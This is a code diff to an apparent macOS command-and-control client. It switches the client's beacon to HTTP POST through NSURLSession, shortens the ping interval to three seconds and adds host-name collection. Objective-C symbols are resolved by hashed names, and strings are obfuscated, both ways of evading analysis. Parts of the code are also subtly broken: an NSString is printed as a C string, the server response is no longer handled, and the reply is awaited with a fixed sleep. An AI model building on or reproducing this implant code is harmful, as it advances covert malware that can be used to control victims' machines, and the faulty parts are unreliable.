@@ -1,12 +1,31 @@
 #include "runtime/kit.h"
 #include "runtime/obf.h"
+#include "runtime/xspring.h"
+#include "runtime/symbol_resolv.h"
+#include <CoreFoundation/CoreFoundation.h>
+#include <CFNetwork/CFNetwork.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdbool.h>
 
-// Configuration structure
+
+#ifdef DEBUG
+#include <stdarg.h>
+static inline void debug_log(const char* fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+    fprintf(stderr, "[DEBUG] ");
+    vfprintf(stderr, fmt, args);
+    fprintf(stderr, "\n");
+    va_end(args);
+}
+#define DEBUG_LOG(...) debug_log(__VA_ARGS__)
+#else
+#define DEBUG_LOG(...) ((void)0)
+#endif
+
 typedef struct {
     char server_host[256];
     int server_port;
@@ -30,7 +49,7 @@ static bool load_config(const char* config_path) {
         // If config doesn't exist, use defaults
         strncpy(config.server_host, "127.0.0.1", sizeof(config.server_host) - 1);
         config.server_port = 4444;
-        config.ping_interval = 60;
+        config.ping_interval = 3;
         snprintf(config.client_id, sizeof(config.client_id), "client_%d", getpid());
         return false;
     }
@@ -64,104 +83,179 @@ static void handle_command(const char* command) {
 }
 
 static bool send_ping(RTKContext* ctx) {
-    // Create input and output streams
-    RTKInstance inputStream = NULL;
-    RTKInstance outputStream = NULL;
+    DEBUG_LOG("Starting HTTP request");
 
-    // Get NSStream class
-    RTKClass streamClass = rtk_get_class(ctx, OBF("NSStream"));
-    if (!streamClass) {
-        fprintf(stderr, OBF("Failed to get NSStream class: %s\n"), rtk_get_error(ctx));
+    // Create NSURL
+    DEBUG_LOG("Creating URL string for http://%s:%d", config.server_host, config.server_port);
+    char url_str[512];
+    snprintf(url_str, sizeof(url_str), "http://%s:%d", config.server_host, config.server_port);
+    RTKInstance urlString = rtk_string_create(ctx, url_str);
+    if (!urlString) {
+        DEBUG_LOG("Failed to create URL string");
+        return false;
+    }
+    DEBUG_LOG("Created URL string: %s", url_str);
+
+    RTKInstance url = rtk_msg_send_obj(ctx,
+        rtk_get_class(ctx, "NSURL"),
+        "URLWithString:",
+        urlString);
+    if (!url) {
+        DEBUG_LOG("Failed to create NSURL");
+        rtk_release(ctx, urlString);
+        return false;
+    }
+    DEBUG_LOG("Created NSURL successfully");
+
+    // Create NSMutableURLRequest
+    DEBUG_LOG("Creating NSMutableURLRequest");
+    RTKInstance request = rtk_msg_send_obj(ctx,
+        rtk_get_class(ctx, "NSMutableURLRequest"),
+        "requestWithURL:",
+        url);
+    if (!request) {
+        DEBUG_LOG("Failed to create request");
+        rtk_release(ctx, urlString);
+        rtk_release(ctx, url);
         return false;
     }
 
-    // Create NSString for hostname
-    RTKInstance hostString = rtk_string_create(ctx, config.server_host);
-    if (!hostString) {
-        fprintf(stderr, "Failed to create host string: %s\n", rtk_get_error(ctx));
-        return false;
-    }
+    // Set HTTP method to POST
+    DEBUG_LOG("Setting HTTP method to POST");
+    RTKInstance postMethod = rtk_string_create(ctx, "POST");
+    rtk_msg_send_obj(ctx, request, "setHTTPMethod:", postMethod);
 
-    // Create port number
-    char port_str[16];
-    snprintf(port_str, sizeof(port_str), "%d", config.server_port);
-    RTKInstance portNumber = rtk_msg_send_class_str(ctx, rtk_get_class(ctx, "NSNumber"),
-                                                   "numberWithInt:", port_str);
-    if (!portNumber) {
-        fprintf(stderr, "Failed to create port number: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, hostString);
-        return false;
-    }
-
-    // Create streams using the modern API with hostname string
-    if (!rtk_msg_send_stream(ctx, streamClass, "getStreamsToHostWithName:port:inputStream:outputStream:",
-                            hostString, portNumber, &inputStream, &outputStream)) {
-        fprintf(stderr, "Failed to create streams: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, hostString);
-        rtk_release(ctx, portNumber);
-        return false;
-    }
-
-    // Release resources we no longer need
-    rtk_release(ctx, hostString);
-    rtk_release(ctx, portNumber);
-
-    // Open streams
-    rtk_msg_send_empty(ctx, inputStream, "open");
-    rtk_msg_send_empty(ctx, outputStream, "open");
-
-    // Send ping
+    // Create request body
     char ping_msg[512];
     snprintf(ping_msg, sizeof(ping_msg), "PING %s\n", config.client_id);
+    DEBUG_LOG("Creating request body: %s", ping_msg);
+    RTKInstance bodyData = rtk_data_create(ctx, (const uint8_t*)ping_msg, strlen(ping_msg));
+    if (!bodyData) {
+        DEBUG_LOG("Failed to create body data");
+        return false;
+    }
+    rtk_msg_send_obj(ctx, request, "setHTTPBody:", bodyData);
 
-    RTKInstance data = rtk_data_create(ctx, ping_msg, strlen(ping_msg));
-    if (!data) {
-        fprintf(stderr, "Failed to create data: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, inputStream);
-        rtk_release(ctx, outputStream);
+    // Set content type header
+    DEBUG_LOG("Setting Content-Type header");
+    RTKInstance contentTypeKey = rtk_string_create(ctx, "Content-Type");
+    RTKInstance contentTypeValue = rtk_string_create(ctx, "text/plain");
+    rtk_msg_send_2obj(ctx, request, "setValue:forHTTPHeaderField:",
+        contentTypeValue, contentTypeKey);
+
+    // Get shared session
+    DEBUG_LOG("Getting shared NSURLSession");
+    RTKInstance session = rtk_msg_send_class(ctx,
+        rtk_get_class(ctx, "NSURLSession"),
+        "sharedSession");
+    if (!session) {
+        DEBUG_LOG("Failed to get shared session");
         return false;
     }
 
-    if (!rtk_msg_send_data_length(ctx, outputStream, "write:maxLength:", data, strlen(ping_msg))) {
-        fprintf(stderr, "Failed to send data: %s\n", rtk_get_error(ctx));
-        rtk_release(ctx, inputStream);
-        rtk_release(ctx, outputStream);
+    // Create data task
+    DEBUG_LOG("Creating data task");
+    RTKInstance dataTask = rtk_msg_send_obj(ctx, session,
+        "dataTaskWithRequest:",
+        request);
+    if (!dataTask) {
+        DEBUG_LOG("Failed to create data task");
         return false;
     }
 
-    // Read response
-    uint8_t buffer[4096];
-    RTKInstance response = rtk_msg_send_buf_length(ctx, inputStream, "read:maxLength:",
-                                                  buffer, sizeof(buffer));
-    if (response) {
-        handle_command((char*)buffer);
-    }
+    // Resume the task
+    DEBUG_LOG("Resuming data task");
+    rtk_msg_send_empty(ctx, dataTask, "resume");
 
-    rtk_release(ctx, inputStream);
-    rtk_release(ctx, outputStream);
+    // Wait for completion
+    DEBUG_LOG("Waiting for response...");
+    usleep(1000000);  // Wait 1 second for response
+    DEBUG_LOG("Wait complete");
+
+    // Cleanup
+    DEBUG_LOG("Cleaning up resources");
+    rtk_release(ctx, urlString);
+    rtk_release(ctx, url);
+    rtk_release(ctx, postMethod);
+    rtk_release(ctx, bodyData);
+    rtk_release(ctx, contentTypeKey);
+    rtk_release(ctx, contentTypeValue);
+    rtk_release(ctx, request);
+    rtk_release(ctx, dataTask);
+    rtk_release(ctx, session);
+
+    DEBUG_LOG("Request cycle complete");
     return true;
 }
 
 int main(int argc, char* argv[]) {
-    const char* config_path = (argc > 1) ? argv[1] : "client.conf";
-    load_config(config_path);
+    DEBUG_LOG("Starting client application");
 
-    RTKContext* ctx = rtk_context_create();
-    if (!ctx) {
-        fprintf(stderr, "Failed to create runtime context\n");
+    INSTANCE instance = {0};
+
+    // Get handle to libobjc
+    void* handle = GetLibraryHandleH(HASHA("LIBOBJC.A.DYLIB"));
+    if (!handle) {
+        printf("Failed to get libobjc handle\n");
         return 1;
     }
 
+    // Resolve objc_msgSend
+    instance.Darwin.objc_msgSend = (objc_msgSend_t)GetSymbolAddressH(handle, HASHA("_objc_msgSend"));
+    if (!instance.Darwin.objc_msgSend) {
+        printf("Failed to resolve objc_msgSend\n");
+        return 1;
+    }
+
+    // Get NSProcessInfo class and selectors
+    Class processInfoClass = objc_getClass("NSProcessInfo");
+    SEL processInfoSel = sel_registerName("processInfo");
+    SEL hostNameSel = sel_registerName("hostName");
+
+    // Call [NSProcessInfo processInfo] using our resolved msgSend
+    id processInfo = instance.Darwin.objc_msgSend((id)processInfoClass, processInfoSel);
+
+    // Call [processInfo hostName]
+    id hostname = instance.Darwin.objc_msgSend(processInfo, hostNameSel);
+
+    printf("Hostname: %s\n", (char*)hostname);
+
+    const char* config_path = (argc > 1) ? argv[1] : "client.conf";
+    DEBUG_LOG("Using config path: %s", config_path);
+
+    if (load_config(config_path)) {
+        DEBUG_LOG("Configuration loaded from file");
+    } else {
+        DEBUG_LOG("Using default configuration");
+    }
+
+    RTKContext* ctx = rtk_context_create();
+    if (!ctx) {
+        DEBUG_LOG("Failed to create runtime context");
+        fprintf(stderr, "Failed to create runtime context\n");
+        return 1;
+    }
+    DEBUG_LOG("Runtime context created successfully");
+
     printf("Client started (ID: %s)\n", config.client_id);
     printf("Connecting to %s:%d\n", config.server_host, config.server_port);
+    DEBUG_LOG("Client initialized with ID: %s", config.client_id);
+    DEBUG_LOG("Server target: %s:%d", config.server_host, config.server_port);
 
     while (should_run) {
+        DEBUG_LOG("Starting ping cycle");
         if (!send_ping(ctx)) {
+            DEBUG_LOG("Ping failed");
             printf("Failed to connect to server, retrying in %d seconds\n", config.ping_interval);
+        } else {
+            DEBUG_LOG("Ping successful");
         }
+        DEBUG_LOG("Waiting %d seconds before next ping", config.ping_interval);
         sleep(config.ping_interval);
     }
 
+    DEBUG_LOG("Shutting down client");
     rtk_context_destroy(ctx);
+    DEBUG_LOG("Cleanup complete");
     return 0;
 }
